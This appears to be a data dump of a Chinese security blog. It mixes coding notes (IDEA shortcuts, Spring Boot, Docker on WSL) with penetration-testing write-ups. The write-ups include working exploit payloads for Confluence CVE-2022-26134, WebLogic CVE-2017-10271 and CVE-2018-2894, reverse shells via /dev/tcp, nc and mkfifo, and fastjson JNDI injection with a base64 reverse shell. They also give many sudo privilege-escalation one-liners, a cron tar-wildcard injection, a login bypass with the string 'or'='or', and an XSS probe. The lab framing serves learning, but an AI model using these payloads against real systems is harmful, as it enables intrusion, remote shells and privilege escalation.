&quot;81dc9bdb52d04dc20036dbd8313ed055","categories":[],"tags":[]},{"title":"","slug":"IDEA快速编码","date":"2024-02-26T01:22:49.743Z","updated":"2022-01-12T06:39:19.352Z","comments":true,"path":"2024/02/26/IDEA快速编码/","permalink":"http://example.com/2024/02/26/IDEA%E5%BF%AB%E9%80%9F%E7%BC%96%E7%A0%81/","excerpt":"","text":"一、 日常开发常用快捷键简介：介绍日常开发中高频使用到的快捷键。 1234567891011121314151617181920212223242526272829快捷键 解释Tab 代码补全Ctrl+c 复制Ctrl+d 复制当前行到下一行Ctrl+v 粘贴ctrl+shift+v 选择待粘贴的内容Ctrl+x 剪切Ctrl + y 删除当前当标所在行Ctrl+z 撤消Ctrl+Shift+z 反撤消Ctrl + / 单行注释Ctrl + Shift + / 多行注释alt +Shift + ↑ 当前行上移alt +Shift + ↓ 当前行下移动Shift + Tab 往左移动当前行内容Tab 往右移动当前行内容Ctrl + alt+ L 格式化代码alt + ← 退回到前一个编辑窗口alt + → 进入下一个编辑的窗口Ctrl + Shift + u 大小写转换alt+insert 生成setter、getter等Ctrl+alt+v 快速生成返回值alt+enter 导包，实现接口中的方法F2 快速跳至错误处ctrl+alt+← 快速跳到上次鼠标停留处ctrl+alt+→ 快速跳到下次鼠标停留处Ctrl+Alt+t 快速生成分支、循环、异常处理等代码块ctrl+e 打开最近修改的文件ctrl+j 注入常用的代码 二、 快速查找及替换简介：介绍查询文件、代码时常使用到的快捷键。 查询文件、代码时常用到的快捷键 12345678快捷键 解释Ctrl+f 查找当前文件内容Ctrl + r 查找并替换当前文件里的内容Ctrl+Shift+f 全局搜索文件内容Ctrl+Shift+r 全局搜索并替换文件内容Ctrl + n 查找java文件Ctrl+Shift+n 查找非java文件，如 yml，properties等double click shift 查找所有文件、方法，忽略文件里的内容 三、 快速重构简介：介绍与重构相关的快捷键。 123456快捷键 解释ctrl+Alt+h 查看方法被哪里引用ctrl+Alt+m 快速抽取方法shift+f6 快速重命名类名、方法名ctrl+alt+b 跳到接口或抽象的具体实现 四、 基础编码相关快捷键简介：介绍编译、运行、调试相关的快捷键。 1234567快捷键 解释ctrl+shift+f10 运行当前类shift+f10 运行当前选择的ctrl+shift+f9 重新编译当前类Alt+Shift+f9 选择debugshift+f9 进入debugctrl+f2 终止程序","categories":[],"tags":[]},{"title":"","slug":"spring_boot","date":"2024-02-26T01:22:49.743Z","updated":"2021-11-29T00:55:09.675Z","comments":true,"path":"2024/02/26/spring_boot/","permalink":"http://example.com/2024/02/26/spring_boot/","excerpt":"","text":"Spring Boot配置绑定配置绑定就是将配置中的值与javabean中对应的属性进行绑定 1.使用@ConfigurationProperties 标注在 JavaBean 的类名上 2.使用@Value注解 JavaBean 的属性上 12@Component 注解来添加组件到容器中@ConfigurationProperties(prefix = &quot;person&quot;) 只有在容器中的组件，才会拥有 SpringBoot 提供的强大功能 导入Spring配置 使用 @ImportResource 注解加载 Spring 配置文件 使用全注解方式加载 Spring 配置 123456781.@Configuration 注解定义配置类，替换 Spring 的配置文；2.//配置类内部可以包含有一个或多个被 @Bean 注解的方法，这些方法会被 AnnotationConfigApplicationContext 或 AnnotationConfigWebApplicationContext 类扫描，构建 bean 定义（相当于 Spring 配置文件中的&lt;bean&gt;&lt;/bean&gt;标签），方法的返回值会以组件的形式添加到容器中，组件的 id 就是方法名。 /*** @Configuration 注解用于定义一个配置类，相当于 Spring 的配置文件* 配置类中包含一个或多个被 @Bean 注解的方法，该方法相当于 Spring 配置文件中的 &lt;bean&gt; 标签定义的组件。*/ 注解12345678910111213141516171819启动注解 @SpringBootApplication@SpringBootConfiguration 注解，继承@Configuration注解，主要用于加载配置文件@EnableAutoConfiguration 注解，开启自动配置功能@ComponentScan 注解，主要用于组件扫描和自动装配@Controller控制器，处理http请求。@RestController 复合注解 查看@RestController源码@RequestMapping 是 Spring Web 应用程序中最常被用到的注解之一。这个注解会将 HTTP 请求映射到 MVC 和 REST 控制器的处理方法上@GetMapping用于将HTTP get请求映射到特定处理程序的方法注解注解简写：@RequestMapping(value = &quot;/say&quot;,method = RequestMethod.GET)等价于：@GetMapping(value = &quot;/say&quot;)@PostMapping用于将HTTP post请求映射到特定处理程序的方法注解@PathVariable:获取url中的数据@RequestParam:获取请求参数的值@RequestHeader 把Request请求header部分的值绑定到方法的参数上@CookieValue 把Request header中关于cookie的值绑定到方法的参数上@RepositoryDAO层注解，DAO层中接口继承JpaRepository&lt;T,ID extends Serializable&gt;,需要在build.gradle中引入相关jpa的一个jar自动加载。","categories":[],"tags":[]},{"title":"","slug":"windows子系统ubuntu安装docker","date":"2024-01-08T02:24:18.386Z","updated":"2024-01-08T03:28:34.230Z","comments":true,"path":"2024/01/08/windows子系统ubuntu安装docker/","permalink":"http://example.com/2024/01/08/windows%E5%AD%90%E7%B3%BB%E7%BB%9Fubuntu%E5%AE%89%E8%A3%85docker/","excerpt":"","text":"windows子系统ubuntu安装dockerUbuntu 22.04安装docker访问docker 官网，获取ubuntu安装命令: 1.先删除旧版本1sudo apt-get remove docker docker-engine docker.io containerd runc 2.更新 ubuntu 更新数据源列表1sudo apt-get update 3.安装 https 请求库12345sudo apt-get install \\ ca-certificates \\ curl \\ gnupg \\ lsb-release 4.添加Docker的官方GPG密钥12sudo mkdir -p /etc/apt/keyringscurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg 5.使用以下命令设置存储库1234echo \\ &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null 6.安装docker 引擎12sudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin 7. 测试安装docker 是否成功1sudo docker run hello-world 报错信息 1https://blog.csdn.net/lupengfei1009/article/details/94637398 Ubantu 报错：System has not been booted with systemd as init system (PID 1). Can‘t operate.WSL 中暂时不支持 systemctl，所以使用下面的命令会报错。 1sudo systemctl 报错信息为 System has not been booted with systemd as init system (PID 1). Can’t operate.Failed to connect to bus: Host is down 使用service 换wsl2","categories":[],"tags":[]},{"title":"cve-2022-26134复现","slug":"cve-2022-26134复现","date":"2022-06-11T07:41:48.000Z","updated":"2022-06-12T09:15:49.948Z","comments":true,"path":"2022/06/11/cve-2022-26134复现/","permalink":"http://example.com/2022/06/11/cve-2022-26134%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"cve-2022-26134复现Atlassian Confluence是一个专业的企业知识管理与协同软件，主要用于公司内员工创建知识库并建立知识管理流程，也可以用于构建企业wiki。其使用简单，但它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。因此，该系统被国内较多知名互联网企业所采用，应用范围较广，因此该漏洞威胁影响范围较大。 漏洞概述Atlassian Confluence存在远程代码执行漏洞，攻击者可以利用该漏洞直接获取目标系统权限。 2022年6月2日，Atlassian发布安全公告，公布了一个Confluence Server和Data Center中的远程代码执行漏洞。 漏洞编号：CVE-2022-26134 漏洞威胁等级：严重 漏洞复现POC数据包： 123456789GET //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: XX.XX.XX.XXUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=3764D915B037D5A50D8025AA793E990AConnection: close 修复方案 官方修复方案： 官方已发布版本 7.4.17、7.13.7、7.14.3、7.15.2、7.16.4、7.17.4 和 7.18.1，其中包含对此漏洞的修复。请尽快升级到新版本 下载地址： https://www.atlassian.com/software/confluence/download-archives 临时缓释方案： 下载官方发布的xwork-1.0.3-atlassian-10.jar替换confluence&#x2F;WEB-INF&#x2F;lib&#x2F;目录下原来的xwork jar文件，并重启Confluence 下载地址： https://packages.atlassian.com/maven-internal/opensymphony/xwork/1.0.3-atlassian-10/xwork-1.0.3-atlassian-10.jar","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"cve","slug":"cve","permalink":"http://example.com/tags/cve/"}]},{"title":"weblogic漏洞复现","slug":"weblogic漏洞复现","date":"2022-06-11T02:13:20.000Z","updated":"2022-06-12T09:15:49.949Z","comments":true,"path":"2022/06/11/weblogic漏洞复现/","permalink":"http://example.com/2022/06/11/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"weblogic漏洞复现1.Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）漏洞描述1Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 环境搭建123启动测试环境：docker-compose up -d等待一段时间，访问`http://your-ip:7001/`即可看到一个404页面，说明weblogic已成功启动。 123456Error 404--Not FoundFrom RFC 2068 Hypertext Transfer Protocol -- HTTP/1.1:xxxxxx Not FoundThe server has not found anything matching the Request-URI. No indication is given of whether the condition is temporary or permanent.If the server does not wish to make this information available to the client, the status code 403 (Forbidden) can be used instead. The 410 (Gone) status code SHOULD be used if the server knows, through some internally configurable mechanism, that an old resource is permanently unavailable and has no forwarding address. 漏洞复现1.访问http://ip:7001/wls-wsat/CoordinatorPortType11，存在下图说明可能有漏洞 2.监听端口 1nc -lvp port 使用burp 发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）： 12345678910111213141516171819202122232425262728293031POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/21 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 4.反弹shell 5.写入文件，访问：http://your-ip:7001/bea_wls_internal/test.jsp）： 12345678910111213141516171819202122232425262728POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 638&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; &lt;void method=&quot;println&quot;&gt;&lt;string&gt; &lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt; ]]&gt; &lt;/string&gt; &lt;/void&gt; &lt;void method=&quot;close&quot;/&gt; &lt;/object&gt;&lt;/java&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 成功访问写入的shell 上传冰蝎 2.Weblogic 任意文件上传漏洞（CVE-2018-2894）Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。 利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。 漏洞环境执行如下命令，启动weblogic 12.2.1.3： 1docker-compose up -d 环境启动后，访问http://your-ip:7001/console，即可看到后台登录页面。 执行docker-compose logs | grep password可查看管理员密码，管理员用户名为weblogic。 登录后台页面，点击base_domain的配置，在“高级”中开启“启用 Web 服务测试页”选项： 漏洞复现访问http://your-ip:7001/ws_utc/config.do，设置Work Home Dir为/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。 然后在安全设置下可以上传webshell，通过burp抓取上传后的数据包，其中有时间戳 然后访问http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell：","categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"weblogic","slug":"weblogic","permalink":"http://example.com/tags/weblogic/"}]},{"title":"Lin.Security靶机渗透","slug":"Lin-Security靶机渗透","date":"2022-06-01T12:50:54.000Z","updated":"2022-06-12T09:15:49.947Z","comments":true,"path":"2022/06/01/Lin-Security靶机渗透/","permalink":"http://example.com/2022/06/01/Lin-Security%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/","excerpt":"","text":"Lin.Security靶机渗透使用以下凭据登录主机账号密码：bob &#x2F; secret 下载地址：https://in.security/downloads/lin.security_v1.0.ova 环境配置开机的一瞬间，按shift，然后按e，就会进入命令行，如下图，修改 rw signie init=/bin/bash,中间的Maybe-ubiquity是原本就有的, 碰到一个博主修改错误的配置方法，搞我心态！！！ 按ctrl+x或者F10重启，重启之后查看网卡为ens33 ifconfig -a 12vim /etc/netplan/50-cloud-init.yamlnetplan apply //配置应用生效 重启 信息收集1.namp扫描 1nmap -sS -sV -T4 -p- 192.168.134.137 1ssh bob@192.168.134.137 sudo提权 sudo -l 查看支持root权限的命令 12345/bin/ash, /usr/bin/awk, /bin/bash, /bin/sh, /bin/csh, /usr/bin/curl, /bin/dash, /bin/ed, /usr/bin/env, /usr/bin/expect, /usr/bin/find, /usr/bin/ftp, /usr/bin/less, /usr/bin/man, /bin/more, /usr/bin/scp, /usr/bin/socat, /usr/bin/ssh, /usr/bin/vi, /usr/bin/zsh, /usr/bin/pico, /usr/bin/rvim, /usr/bin/perl, /usr/bin/tclsh, /usr/bin/git, /usr/bin/script, /usr/bin/scp socat权限 先建立一个1234的shell 1sudo socat tcp-listen:1234,reuseaddr,fork exec:sh,pty,stderr,setsid,sigint,sane 新建一个远程连接，在启动本地1234的listen 1socat FILE:`tty`,raw,echo=0 TCP:127.0.0.1:1234 awk权限 1sudo awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27; ed提权 ed命令用于启动ed文本编辑器，使用ed命令访问空缓冲区来调用bash&#x2F;sh shell造成提权。 12sudo ed!sh 这里有个问题，exit无法退出，需要使用w保存，q退出： find提权 1sudo find . -exec /bin/sh \\; -quit env环境变量提权 1234应用程序使用了system等函数调用了系统命令，但是没有使用绝对路径而是使用env命令从环境变量中进行查找，这就可能通过修改环境变量来进行权限提升sudo sh -c &#x27;cp $(which env) .; chmod +s ./env&#x27;./env /bin/sh -p less、more、man提权 123456789sudo less /etc/passwd!/bin/sh sudo more /etc/passwd!/bin/sh Sudo man man !/bin/sh expect提权 expect是一个自动化交互套件，主要应用于执行命令和程序时，系统以交互形式要求输入指定字符串，实现交互通信。 1sudo expect -c &quot;spawn /bin/sh;interact&quot; scp提权 1234TF=$(mktemp)echo &#x27;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; &gt; $TFchmod +x &quot;$TF&quot;sudo scp -S $TF x y: 123sudo pico^R^Xreset; sh 1&gt;&amp;0 2&gt;&amp;0 ssh提权 1sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x vi提权 1sudo vi -c &#x27;:!/bin/sh&#x27; /dev/null pico提权 123sudo pico^R^Xreset; sh 1&gt;&amp;0 2&gt;&amp;0 1这个操作方法：在键盘上按住ctrl+r和ctrl+x然后执行下面的命令，执行完成之后再次按住ctrl+r和ctrl+x再输入要执行的命令，比如id，那么就会以root权限执行 rvim提权 1sudo rvim -c &#x27;:python3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27; perl提权 1sudo perl -e &#x27;exec &quot;/bin/sh&quot;;&#x27;s tclsh提权 12sudo tclshexec /bin/sh &lt;@stdin &gt;@stdout 2&gt;@stderrs git提权 12sudo git -p help config!/bin/sh script提权 1sudo script -q /dev/null 密码信息收集提权 cat &#x2F;etc&#x2F;passwd, 类似root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash，在这种情况下，x表示该用户的密码哈希存储在&#x2F;etc&#x2F;shadow中 尝试爆破 taskset提权：1taskset 1 /bin/bash -p 定时任务cron提权：查看定时任务cat &#x2F;etc&#x2F;crontab 1.在kali上生成反弹shell的payload： 1msfvenom -p cmd/unix/reverse_netcat lhost=192.168.134.130 lport=1234 R payload 1mkfifo /tmp/wkee; nc 192.168.134.130 1234 0&lt;/tmp/wkee | /bin/sh &gt;/tmp/wkee 2&gt;&amp;1; rm /tmp/wkee 2.将payload写入到定时任务的sh文件中： 123echo &quot;mkfifo /tmp/wkee; nc 192.168.134.130 1234 0&lt;/tmp/wkee | /bin/sh &gt;/tmp/wkee 2&gt;&amp;1; rm /tmp/wkee&quot; &gt; shell.sh &amp;&amp; chmod +x shell.shecho &quot;&quot; &gt; &quot;–checkpoint-action=exec=sh shell.sh&quot; //注入一个指定检查点动作的标志echo &quot;&quot; &gt; --checkpoint=1 //注入一个标志来指定我们的检查点 3.打开另一个窗口，重新远程登陆，进行监听，成功反弹shell","categories":[],"tags":[{"name":"靶机","slug":"靶机","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"JNDI-Injection-Exploit学习使用","slug":"JNDI-Injection-Exploit学习使用","date":"2022-05-27T05:23:38.000Z","updated":"2022-05-28T03:05:30.249Z","comments":true,"path":"2022/05/27/JNDI-Injection-Exploit学习使用/","permalink":"http://example.com/2022/05/27/JNDI-Injection-Exploit%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/","excerpt":"","text":"JNDI-Injection-Exploit学习使用在系统中发现json交互请求，尝试利⽤dnslog的⽅式判断后端json框架，成功收到dnslog请求，判断系统使⽤了fastjson框架 1234dnslog 回显&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dbslog地址&quot;&#125;&#125; 反弹地址进行base64编码 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.20.100.4&#x2F;39001 0&gt;&amp;1 本地执行1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMzYuMTExLjY4LzM5MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;172.20.100.5&quot; 直接使用java -jar开启监听出现问题，JVM_Bind被占用 123456789101112Exception in thread &quot;main&quot; java.net.BindException: Address already in use: JVM_Bind at java.net.DualStackPlainSocketImpl.bind0(Native Method) at java.net.DualStackPlainSocketImpl.socketBind(Unknown Source) at java.net.AbstractPlainSocketImpl.bind(Unknown Source) at java.net.PlainSocketImpl.bind(Unknown Source) at java.net.ServerSocket.bind(Unknown Source) at java.net.ServerSocket.&lt;init&gt;(Unknown Source) at java.net.ServerSocket.&lt;init&gt;(Unknown Source) at javax.net.DefaultServerSocketFactory.createServerSocket(Unknown Source) at jndi.RMIRefServer.&lt;init&gt;(RMIRefServer.java:80) at run.ServerStart.&lt;init&gt;(ServerStart.java:87) at run.ServerStart.main(ServerStart.java:56) 12345netstat -aon | findstr “8180”netstat -aon | findstr “1099”netstat -aon | findstr “1389”tasklist | findstr “3500”进一步查看3500进程的具体信息。taskkill /pid 3500 /F 结束占用的进程 12345678910111213141516[ADDRESS] &gt;&gt; 172.20.100.5[COMMAND] &gt;&gt; bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMzYuMTExLjY4LzM5MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;----------------------------JNDI Links----------------------------Target environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi://172.20.100.5:1099/z4qacyldap://172.20.100.5:1389/z4qacyTarget environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi://172.20.100.5:1099/s6tqzaTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi://172.20.100.5:1099/84c8dhldap://172.20.100.5:1389/84c8dh----------------------------Server Log----------------------------2022-05-27 13:45:50 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:81802022-05-27 13:45:50 [RMISERVER] &gt;&gt; Listening on 0.0.0.0:10992022-05-27 13:45:53 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389 监听端口 nc lvp 39001 使⽤payload进⾏漏洞攻击1234&#123; &quot;a&quot;: &#123; &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;b&quot;: &#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi://172.20.100.5:1099/84c8dh&quot;,&quot;autoCommit&quot;: true &#125;&#125;","categories":[],"tags":[{"name":"JNDI-Injection-Exploit","slug":"JNDI-Injection-Exploit","permalink":"http://example.com/tags/JNDI-Injection-Exploit/"}]},{"title":"nmap的学习使用","slug":"nmap的学习使用","date":"2022-05-26T11:39:36.000Z","updated":"2022-05-29T04:09:33.233Z","comments":true,"path":"2022/05/26/nmap的学习使用/","permalink":"http://example.com/2022/05/26/nmap%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/","excerpt":"","text":"nmap的学习使用1nmap -T4 -A -sS -vv -Pn 目标说明-iL 从已有的ip列表文件中读取并扫描 -iR+扫描数量 随机选择目标进行扫描 --exclude+ip 不扫描此ip 主机发现-sL 列出要扫描的ip -sn 不进行端口扫描 -Pn 将所有主机都默认为在线，跳过主机发现 -PS/PA/PU/PY 使用TCP、SYN&#x2F;ACK、udp或SCTP协议去发现端口 -PE/PP/PM：使用ICMP响应（echo）、时间戳或子网掩码请求来发现探测 -PO 使用IP协议的ping -n 不做DNS解析 -R 总是做DNS反向解析 --dns-servers指定自定义的DNS服务器 --system-dns 使用操作系统的DNS --traceroute 追踪每台主机的跳转路径 扫描技术-sS/sT/sA/sW/sM：使用SYN、TCP、全连接Connect()、ACK、Window、Maimon来进行扫描 -sU UDP扫描 -sN/sF/sX 使用TCP Null(无flag)、FIN、Xmas（FIN+Push+Urgent）扫描 --scanflags +flags 自定义TCP扫描的flags -sI 僵尸机扫描 -sY/sZ 使用SCTP协议的INIT&#x2F;COOKIE-ECHO扫描 -sO 进行IP协议扫描 -b &lt;FTP relay host&gt;：指定FTP中继主机进行FTP反弹扫描端口说明和扫描规则-p 只扫描指定的端口 --exclude-ports 不对此端口进行扫描 -F 快速模式，扫描比默认端口数量更少的端口 -r 有序地扫描端口而不是随机地扫描 --top-ports &lt;number&gt; 扫描排名指定的数字前几位的最常用的端口 --port-ratio &lt;ratio&gt; 扫描比输入的比例更常用的端口 服务、版本探测-sV：探测开启的端口来获取服务、版本信息 --version-intensity &lt;level&gt;：设置探测服务、版本信息的强度 --version-light：强度为2的探测强度 --version-all：强度为9的探测强度 --version-trace：将扫描的具体过程显示出来 脚本扫描-sC：等同于–script&#x3D;default --script=&lt;Lua scripts&gt;：指定使用Lua脚本进行扫描 --script-args=&lt;n1=v1,[n2=v2,...]&gt;：指定脚本的参数 --script-args-file=filename：指定提供脚本参数的文件 --script-trace：显示全部发送和收到的数据 --script-updatedb：更新脚本的数据库 --script-help=&lt;Lua scripts&gt;：显示脚本的相关信息 系统探测-O：进行系统探测 --osscan-limit：限制系统探测的目标，如只探测Linux系统 --osscan-guess：更侵略性地猜测系统 定时和性能-T&lt;0-5&gt;：设置时序模块，越高越快 --min-hostgroup/max-hostgroup &lt;size&gt;：指定最小、最大的并行主机扫描组大小 --min-parallelism/max-parallelism &lt;numprobes&gt;：指定最小、最大并行探测数量 --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;：指定最小、最大的扫描往返时间 --max-retries &lt;tries&gt;：指定最大的重发扫描包的次数 --host-timeout &lt;time&gt;：指定超时时间 --scan-delay/--max-scan-delay &lt;time&gt;：指定每次探测延迟多长时间，即两次探测之间间隔多少时间 --min-rate &lt;number&gt;：最小的发包速率 --max-rate &lt;number&gt;：最大的发包速率 防火墙、IDS绕过和欺骗-f; --mtu &lt;val&gt;：设置MTU最大传输单元 -D &lt;decoy1,decoy2[,ME],...&gt;：伪造多个IP地址和源地址一同发送包，从而隐藏在众多的IP地址中而不易被发现 -S &lt;IP_Address&gt;：伪造源地址 -e &lt;iface&gt;：使用指定的接口 -g/--source-port &lt;portnum&gt;：使用指定的源端口 --proxies &lt;url1,[url2],...&gt;：指定代理服务器进行扫描 --data &lt;hex string&gt;：在发送包的数据字段中追加自定义的十六进制字符串 --data-string &lt;string&gt;：在发送包的数据字段中追加自定义的ASCII字符串 --data-length &lt;num&gt;：在发送包的数据字段中追加随机的数据 --ip-options &lt;options&gt;：使用指定的IP选项发送包 --ttl &lt;val&gt;：设置TTL值 --spoof-mac &lt;mac address/prefix/vendor name&gt;：伪造源Mac地址 --badsum：发送伪造TCP&#x2F;UDP&#x2F;SCTP校验和Checksum的数据包 输出-oN/-oX/-oS/-oG &lt;file&gt;：分别输出正常、XML、s| 杂项-6：扫描IPv6的地址 -A：一次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描 --datadir &lt;dirname&gt;：指定自定义的数据文件位置 --send-eth/--send-ip：使用原始以太网帧或IP数据包发送 --privileged：假设用户有全部权限 --unprivileged：假设用户缺少原始套接字权限 -V：输出版本号 -h：输出帮助信息","categories":[],"tags":[{"name":"nmap","slug":"nmap","permalink":"http://example.com/tags/nmap/"}]},{"title":"偶遇挖洞","slug":"偶遇挖洞","date":"2022-05-26T05:34:45.000Z","updated":"2022-05-27T02:22:03.164Z","comments":true,"path":"2022/05/26/偶遇挖洞/","permalink":"http://example.com/2022/05/26/%E5%81%B6%E9%81%87%E6%8C%96%E6%B4%9E/","excerpt":"","text":"偶遇挖洞经历一波谷歌hack，已知某后台地址 &#x2F;manage&#x2F;login.asp,后台万能密码：’or’&#x3D;’or’ 可直接登陆 1.后台万能密码登录 账号root，万能密码 ‘or’&#x3D;’or’这直接进入后台 2.xss漏洞在前端找到一处搜索框，f12，使用双引号闭合 xss测试1&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"http://example.com/tags/xss/"},{"name":"挖洞","slug":"挖洞","permalink":"http://example.com/tags/%E6%8C%96%E6%B4%9E/"},{"name":"万能密码","slug":"万能密码","permalink":"http://example.com/tags/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/"}]},{"title":"openssl心脏滴血漏洞","slug":"openssl心脏滴血漏洞","date":"2022-05-25T05:13:51.000Z","updated":"2022-05-25T05:31:12.709Z","comments":true,"path":"2022/05/25/openssl心脏滴血漏洞/","permalink":"http://example.com/2022/05/25/openssl%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"openssl心脏滴血漏洞心脏出血漏洞”是指openssl这个开源软件中的一个漏洞，因为该软件使用到一个叫做heartbeat(中文名称为心跳)的扩展，恰恰是这个扩展出现了问题，所以才将这个漏洞形象的称为“心脏出血”； 影响范围OpenSSL 1.0.1版本 漏洞复现nmap -O xxxxx 查看开放端口 nmap xxxx –script&#x3D;vuln nmap -sV -p 8443 –script ssl-heartbleed.nse xxxxxx msf1234search heartbleeduse uxiliary/scanner/ssl/openssl_heartbleed 123设置一下verbose，让verbose为true这样我们才可以看到泄露的64kb数据set verbose 